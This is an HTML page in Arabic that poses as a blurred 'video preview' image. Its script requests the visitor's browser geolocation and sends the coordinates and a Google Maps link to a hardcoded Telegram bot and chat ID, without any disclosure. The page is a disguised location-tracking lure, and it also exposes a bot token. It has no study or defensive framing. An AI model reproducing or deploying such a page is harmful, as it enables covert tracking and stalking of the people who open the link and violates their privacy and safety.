<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>معاينة فيديو</title>
<style>
  body {
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #000;
  }
  img {
    max-width: 100%;
    max-height: 100%;
    filter: blur(1px); /* تمويه خفيف */
    border-radius: 10px;
  }
</style>
</head>
<body>
<img src="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg" alt="Video Preview">

<script>
function sendLocationToBot(lat, lon) {
    const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
    const chatId = "6495557039";
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    });
}

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => sendLocationToBot(pos.coords.latitude, pos.coords.longitude),
        err => console.warn("⚠️ لم يتم السماح بالحصول على الموقع")
    );
}
</script>
</body>
</html>
